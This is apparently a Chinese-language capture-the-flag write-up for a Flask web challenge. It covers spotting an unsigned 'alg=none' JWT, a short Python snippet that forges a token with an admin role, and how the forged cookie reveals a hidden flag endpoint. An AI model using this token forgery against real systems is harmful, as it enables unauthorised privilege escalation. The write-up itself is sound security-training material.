## 题解

### 入口与指纹

Flask 极简站点：`/` → `/login`，登录后 `/profile` 只渲染 `<h1>USER</h1>`。
`test:test` 失败，`user:user` 成功。

登录响应下发 **未签名的 JWT**（`alg=none`）：

```text
token = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
```

payload 为 `{"username":"user","role":"user"}`。

### 利用

把 `role` 改成 `admin`（`alg=none`，第三段留空即可）：

```python
import base64, json
b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
token = b64({"alg": "none", "typ": "JWT"}) + "." + b64({"username": "admin", "role": "admin"}) + "."
```

带该 cookie 访问 `/profile` 会出现隐藏链接 `<a style="display:none" href="/gettheflag">`；
直接 `GET /gettheflag` 返回 flag。

### flag 位置

`/gettheflag` 页面正文。

## 复盘

- 看到 JWT 先解码 header：`alg=none` 直接改 payload 即可。
- 前端隐藏元素（`display:none`）是角色差异的明显信号。
